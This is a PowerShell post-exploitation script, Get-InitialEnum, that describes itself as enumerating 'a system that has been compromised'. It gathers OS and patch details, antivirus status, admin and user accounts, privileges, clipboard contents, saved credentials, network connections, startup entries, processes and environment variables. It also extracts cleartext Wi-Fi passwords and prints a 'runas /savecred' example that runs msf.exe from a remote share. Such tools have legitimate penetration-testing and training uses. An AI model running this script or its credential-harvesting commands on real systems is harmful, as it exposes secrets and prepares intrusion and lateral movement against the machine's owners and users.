<#
.SYNOPSIS
This cmdlet was created to perform enumeration of a Windows system using PowerShell.


.DESCRIPTION
This cmdlet enumerates a system that has been compromised to better understand what is running on the target. This does not test for any PrivEsc methods it only enumerates machine info. Use Test-PrivEsc to search for possible exploits.


.PARAMETER FilePath
This parameter defines the location to save a file containing the results of this cmdlets execution


.EXAMPLE
Get-InitialEnum
# This example returns information on the local device

.EXAMPLE
Get-InitialEnum -FilePath C:\Temp\enum.txt
# This example saves the results of this command to the file C:\Temp\enum.txt


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://roberthsoborne.com
https://osbornepro.com
https://btps-secpack.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.youracclaim.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.Management.Automation.PSObject


.OUTPUTS
System.Object

#>
Function Get-InitialEnum {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [String]$FilePath
        )  # End param

BEGIN
{

    Function Show-KerberosTokenPermissions {
    [CmdletBinding()]
        param()

    $Token = [System.Security.Principal.WindowsIdentity]::GetCurrent()

    ForEach ($SID in $GroupSIDs)
    {

        Try
        {

            Write-Output (($sid).Translate([System.Security.Principal.NTAccount]))

        }  # End Try
        Catch
        {

            Write-Warning ("Could not translate " + $SID.Value + ". Reason: " + $_.Exception.Message)

        }  # End Catch
    }

    $Token

}  # End Function Show-KerberosTokenPermissions


    Function Get-Driver {
        [CmdletBinding()]
            Param (
                [Switch]$Unsigned,
                [Switch]$Signed,
                [Switch]$All)  # End param
    BEGIN
    {

        Write-Output "Retrieving driver signing information …" -ForegroundColor "Cyan"

    } # End of Begin section
    PROCESS
    {

        If ($Signed)
        {

            Write-Verbose "Obtaining signed driver info..."
            $DrvSig = DriverQuery -SI | Select-String -Pattern "True"

            $DrvSig
            "`n " + $DrvSig.count + " signed drivers, note TRUE column"

        }  # End of If
        ElseIf ($UnSigned)
        {

            Write-Verbose "Obtaining signed driver info..."
            $DrvU = DriverQuery -SI | Select-String "False"

            $DrvU
            "`n " + $DrvU.count + " unsigned drivers, note FALSE column"

        }  # End ElseIf
        ElseIf ($All)
        {

            DriverQuery -SI

        }  # End ElseIf
        Else
        {

            DriverQuery

        }  # End Else

    } # End PROCESS

    } # End Function Get-Driver


    Function Get-AntiVirusProduct {
        [CmdletBinding()]
            param (
                [Parameter(
                    Mandatory=$False,
                    Position=0,
                    ValueFromPipeline=$True,
                    ValueFromPipelineByPropertyName=$true)]
        [Alias('Computer')]
        [string]$ComputerName=$env:COMPUTERNAME )  # End param

        $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName

        $Ret = @()
        ForEach ($AntiVirusProduct in $AntiVirusProducts)
        {
           #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
            Switch ($AntiVirusProduct.productState)
            {
                "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}

                Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
            }  # End Switch

            $HashTable = @{}
            $HashTable.Computername = $ComputerName
            $HashTable.Name = $AntiVirusProduct.DisplayName
            $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
            $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
            $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
            $HashTable.'Definition Status' = $DefStatus
            $HashTable.'Real-time Protection Status' = $RtStatus

            $Ret += New-Object -TypeName "PSObject" -Property $HashTable

        }  # End ForEach

        $Ret

    }  # End Function Get-AntiVirusProduct

}  # End BEGIN
PROCESS
{
#================================================================
#  SECURITY PATCHES
#================================================================
    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" 
    Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser

    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" 
    Try
    {

        Get-Hotfix -Description "Security Update"

    }  # End Try
    Catch
    {

        Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering' | Select-Object -Property HotFixID

    }  # End Catch

#===================================================================
#  NETWORK SHARES AND DRIVES
#===================================================================
Write-Output "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" 
Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSystem" } | Format-Table -AutoSize


#===================================================================
#  FIND UNSIGNED DRIVERS
#===================================================================

    Get-Driver -Unsigned

#===================================================================
#  FIND SIGNED DRIVERS
#===================================================================

    Get-Driver -Signed

#==========================================================================
#  ANTIVIRUS APPLICATION INFORMATION
#==========================================================================
    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" 

    Get-AntiVirusProduct

#==========================================================================
#  USER, USER PRIVILEDGES, AND GROUP INFO
#==========================================================================
    Write-Output "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" 
    Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"

    Write-Output "=================================`n|       USER & GROUP LIST       |`n=================================" 
    Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
    Get-LocalGroup | Format-Table -Property "Name"

    Write-Output "=================================`n|  CURRENT USER PRIVS   |`n=================================" 
    whoami /priv

    Write-Output "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" 
    Get-ChildItem -Path C:\Users | Select-Object -Property "Name"

    Write-Output "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" 
    Get-Clipboard

    Write-Output "=================================`n|  SAVED CREDENTIALS  |`n=================================" 
    cmdkey /list
    Write-Output "If you find a saved credential it can be used issuing a command in the below format: "
    Write-Output 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'

    Write-Output "=================================`n|  SIGNED IN USERS  |`n=================================" 
    qwinsta


    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" 
    Show-KerberosTokenPermissions

#==========================================================================
#  NETWORK INFORMATION
#==========================================================================
    Write-Output "=================================`n|   LISTENING PORTS   |`n=================================" 
    Get-NetTcpConnection -State "Listen" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize

    Write-Output "=================================`n|  ESTABLISHED CONNECTIONS  |`n=================================" 
    Get-NetTcpConnection -State "Established" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize

    Write-Output "=================================`n|  DNS SERVERS  |`n=================================" 
    Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize

    Write-Output "=================================`n|  ROUTING TABLE  |`n=================================" 
    Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize

    Write-Output "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" 
    Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize

    Write-Output "=================================`n|  Wi-Fi Passwords  |`n=================================" 
    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

#==========================================================================
#  APPLICATION INFO
#==========================================================================
    Write-Output "=================================`n| INSTALLED APPLICATIONS |`n=================================" 

    $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'

    ForEach ($Path in $Paths)
    {

        Get-ChildItem -Path $Path | Get-ItemProperty | Select-Object -Property "DisplayName","Publisher","InstallDate","DisplayVersion" | Format-Table -AutoSize

    }  # End ForEach

    Write-Output "=================================`n| STARTUP APPLICATIONS |`n=================================" 
    Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize

    $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppCurrentUser)
    {

        Write-Output "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"

    }  # End If

    $StartupAppAllUsers = (Get-ChildItem -Path "C:\Users\All Users\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppAllUsers)
    {

        Write-Output "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"

    }  # End If

    Write-Output "Check below values for binaries you may be able to execute as another user."
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'


#==========================================================================
#  PROCESS AND SERVICE ENUMERATION
#==========================================================================
    Write-Output "=================================`n|  PROCESS ENUMERATION  |`n=================================" 
    Get-WmiObject -Query "Select * from Win32_Process" | Where-Object { $_.Name -notlike "svchost*" } | Select-Object -Property "Name","Handle",@{Label="Owner";Expression={$_.GetOwner().User}} | Format-Table -AutoSize

    Write-Output "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" 
    Get-ChildItem -Path "Env:" | Format-Table -Property "Key","Value"


#==========================================================================
# BROWSER INFO
#==========================================================================
    Write-Output "================================`n| BROWSER INFO |`n==================================="
    Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name "start page" | Select-Object -Property "Start Page"

    $Bookmarks = [Environment]::GetFolderPath('Favorites')
    Get-ChildItem -Path $BookMarks -Recurse -Include "*.url" | ForEach-Object {
        
        Get-Content $_.FullName | Select-String -Pattern URL
        
    }  # End ForEach-Object

}  # End PROCESS

}  # End Function Get-InitialEnum
